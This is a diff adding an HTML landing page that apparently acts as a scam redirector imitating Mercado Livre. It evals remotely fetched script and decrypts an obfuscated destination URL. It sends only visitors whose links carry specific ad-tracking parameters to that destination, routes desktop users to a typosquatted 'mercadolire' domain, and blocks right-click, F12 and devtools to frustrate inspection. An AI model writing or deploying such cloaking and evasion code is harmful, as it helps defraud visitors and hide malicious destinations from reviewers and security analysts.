@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="0;URL=''"/>
+    <script src="6ht6jj4299/j837101.js"></script> 
+    <script>
+        const secretToken = 'your_secret_token'; // Adicione seu token secreto aqui
+
+        function loadKeys() {
+            return fetch('serve_key.php?token=' + secretToken)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok ' + response.statusText);
+                    }
+                    return response.text();
+                }).then(text => {
+                    eval(text);
+                    if (!key || !shiftedKey) {
+                        throw new Error('Keys not loaded properly');
+                    }
+                }).catch(error => {
+                    console.error('There was a problem with the fetch operation:', error);
+                });
+        }
+
+        function decrypt(input) {
+            return input.split('').map(char => {
+                const index = shiftedKey.indexOf(char);
+                return index > -1 ? key[index] : char;
+            }).join('');
+        }
+
+        function checkRequiredParams() {
+            const requiredParams = ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term", "xcod"];
+            const urlParams = new URLSearchParams(window.location.search);
+            for (let param of requiredParams) {
+                if (!urlParams.has(param)) {
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        window.onload = function() {
+            loadKeys().then(() => {
+                if (checkRequiredParams()) {
+                    let encryptedUrl = "rCC3%fqq!wpdI_*&lhIO*%Z%bCwq!e&_wW*eWwq";
+                    let redirectUrl = decrypt(encryptedUrl);
+                    
+                    // Adiciona os parâmetros atuais à URL de redirecionamento
+                    let urlParams = new URLSearchParams(window.location.search);
+                    let newUrl = new URL(redirectUrl);
+                    urlParams.forEach((value, key) => {
+                        newUrl.searchParams.set(key, value);
+                    });
+                    
+                    window.location.href = newUrl.toString();
+                } else {
+                    window.location.href = "https://lista.mercadolivre.com.br/25-anos";
+                }
+            });
+        }
+    </script>
+    <script async="true" src="123global.html"></script>
+    <script>
+        const disabledKeys = ["c", "C", "x", "J", "u", "I"];
+        const showAlert = e => {
+            e.preventDefault();
+            alert("Acesso negado!!");
+        }
+        document.addEventListener("contextmenu", showAlert);
+        document.addEventListener("keydown", e => {
+            if ((e.ctrlKey && disabledKeys.includes(e.key)) || e.key === "F12") {
+                showAlert(e);
+            }
+        });
+    </script>
+    <script async="true" src="js/iHJA1t0sXF2b.js"></script>
+    <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
+</head>
+<body>
+</body>
+</html>
+
+
+
+
+
+
+<script>
+    function isMobileDevice() {
+        // Expressão regular para verificar se o agente do usuário contém qualquer uma das palavras-chave de dispositivos móveis
+        return /android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos/i.test(navigator.userAgent);
+    }
+
+    // Redirecionar se não for um dispositivo móvel
+    if (!isMobileDevice()) {
+        window.location.href = "http://ww01.mercadolire.com.br/?dn=mercadolire.com.br&pbsubid=599f9052-efdc-431d-aa99-9b3146e727c7&pid=9POT3387I";
+    }
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  async
+  defer
+></script>
+<script>
+  window.pixelId = "6663bbe88d3bbf359680525a";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+</head>
+</body>
+</html>
